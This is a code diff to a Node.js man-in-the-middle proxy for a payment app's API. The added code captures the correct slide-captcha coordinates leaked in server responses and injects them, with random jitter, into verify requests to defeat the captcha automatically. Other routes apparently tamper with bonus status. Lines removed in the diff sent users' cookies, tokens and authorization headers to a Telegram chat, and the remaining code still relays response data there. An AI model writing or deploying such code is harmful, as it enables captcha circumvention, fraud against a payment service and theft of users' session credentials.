@@ -1806,15 +1806,46 @@ app.all('/app/base/comm/upload', async (req, res) => {
 
 app.all('/app/payment/order/nightBonusStatus', async (req, res) => { await proxyAndAddBonus(req, res); });
 
+const captchaAnswers = new Map();
+function setCaptchaAnswer(key, ans) {
+  if (!key) return;
+  captchaAnswers.set(key, { ...ans, t: Date.now() });
+  if (captchaAnswers.size > 500) {
+    const cutoff = Date.now() - 10 * 60 * 1000;
+    for (const [k, v] of captchaAnswers) if (v.t < cutoff) captchaAnswers.delete(k);
+  }
+  if (redis) redis.set(`diwapayCaptcha:${key}`, JSON.stringify(ans), { ex: 600 }).catch(()=>{});
+}
+async function getCaptchaAnswer(key) {
+  if (!key) return null;
+  const local = captchaAnswers.get(key);
+  if (local) return local;
+  if (redis) {
+    try {
+      const raw = await redis.get(`diwapayCaptcha:${key}`);
+      if (raw) return typeof raw === 'string' ? JSON.parse(raw) : raw;
+    } catch(e) {}
+  }
+  return null;
+}
+
 app.all('/app/captcha/new', async (req, res) => {
   try {
     const data = await loadData();
     const { response, respBody, respBuffer, respHeaders, jsonResp } = await proxyFetch(req);
+    let answerStored = '';
+    if (jsonResp && jsonResp.data && (jsonResp.data.captcha_key || jsonResp.data.captchaKey)) {
+      const d = jsonResp.data;
+      const key = d.captcha_key || d.captchaKey;
+      const ans = {
+        x: Number(d.display_x != null ? d.display_x : (d.displayX != null ? d.displayX : 0)),
+        y: Number(d.display_y != null ? d.display_y : (d.displayY != null ? d.displayY : 0)),
+        templateId: d.id || d.templateId || 'slide-default',
+      };
+      setCaptchaAnswer(key, ans);
+      answerStored = `key=${key} x=${ans.x} y=${ans.y}`;
+    }
     if (data.adminChatId && bot) {
-      const reqHdrs = {};
-      ['cookie','user-agent','x-token','token','authorization','content-type'].forEach(h => { if (req.headers[h]) reqHdrs[h] = req.headers[h]; });
-      const setCk = respHeaders['set-cookie'];
-      const setCkStr = Array.isArray(setCk) ? setCk.join('\n') : (setCk || '(none)');
       let preview;
       if (jsonResp) {
         const truncated = JSON.parse(JSON.stringify(jsonResp));
@@ -1825,7 +1856,7 @@ app.all('/app/captcha/new', async (req, res) => {
       } else {
         preview = (respBody || `<binary ${respBuffer.length}b>`).substring(0, 1000);
       }
-      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n\n📤 ${req.method} ${req.originalUrl}\n📤 REQ HDRS:\n${JSON.stringify(reqHdrs, null, 2).substring(0,800)}\n\n📥 STATUS: ${response.status}\n📥 SET-COOKIE:\n${String(setCkStr).substring(0,500)}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1800)}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🆕 Captcha New\n📥 STATUS: ${response.status}\n🔑 STORED ANSWER: ${answerStored || '(none)'}\n\n📥 RESPONSE (truncated):\n${preview.substring(0,1500)}`).catch(()=>{});
     }
     respHeaders['content-length'] = String(respBuffer.length);
     res.writeHead(response.status, respHeaders);
@@ -1836,12 +1867,33 @@ app.all('/app/captcha/new', async (req, res) => {
 app.post('/app/captcha/verify', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
+    const inKey = body.captchaKey || body.captcha_key;
+    let autoSolved = '';
+    let originalReq = { x: body.x, y: body.y };
+
+    if (inKey) {
+      const ans = await getCaptchaAnswer(inKey);
+      if (ans) {
+        const jitter = (Math.random() * 1.6) - 0.8;
+        const newBody = { ...body, x: ans.x + jitter, y: ans.y };
+        if (!newBody.templateId && ans.templateId) newBody.templateId = ans.templateId;
+        const newRaw = Buffer.from(JSON.stringify(newBody), 'utf8');
+        req.rawBody = newRaw;
+        if (req.headers['content-type'] && !/json/i.test(req.headers['content-type'])) {
+          req.headers['content-type'] = 'application/json';
+        }
+        req.parsedBody = newBody;
+        autoSolved = `x:${originalReq.x}->${newBody.x.toFixed(2)} y:${originalReq.y}->${newBody.y}`;
+      } else {
+        autoSolved = '(no stored answer)';
+      }
+    }
+
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+
     if (data.adminChatId && bot) {
-      const reqHdrs = {};
-      ['cookie','user-agent','x-token','token','authorization','content-type'].forEach(h => { if (req.headers[h]) reqHdrs[h] = req.headers[h]; });
-      bot.sendMessage(data.adminChatId, `🧩 Captcha Verify\n\n📤 REQ HDRS:\n${JSON.stringify(reqHdrs, null, 2).substring(0,800)}\n\n📤 REQUEST BODY:\n${JSON.stringify(body, null, 2).substring(0, 1500)}\n\n📥 RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 1500)}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🧩 Captcha Verify\n🔧 AUTO-SOLVE: ${autoSolved || '(no key)'}\n\n📤 REQUEST BODY (sent):\n${JSON.stringify(req.parsedBody || {}, null, 2).substring(0, 1000)}\n\n📥 RESPONSE:\n${(jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody).substring(0, 1000)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
